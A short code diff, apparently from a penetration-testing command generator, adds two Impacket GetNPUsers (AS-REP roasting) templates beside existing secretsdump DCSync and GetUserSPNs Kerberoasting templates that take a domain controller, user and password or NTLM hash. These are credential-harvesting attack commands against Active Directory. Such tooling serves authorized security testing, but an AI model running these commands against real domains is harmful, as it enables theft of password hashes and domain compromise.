@@ -110,6 +110,11 @@ const domainCommands: Command[] = [
   },
   {
     template:
+      "impacket-GetNPUsers -request -dc-ip '{targetHost}' '{domain}'/'{username}':'{password}'",
+    authType: "password",
+  },
+  {
+    template:
       "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}':'{password}'@'{targetHost}'",
     authType: "password",
   },
@@ -219,6 +224,11 @@ const domainCommands: Command[] = [
   {
     template:
       "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
+    authType: "ntlmHash",
+  },
+  {
+    template:
+      "impacket-GetNPUsers -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}'",
     authType: "ntlmHash",
   },
   {
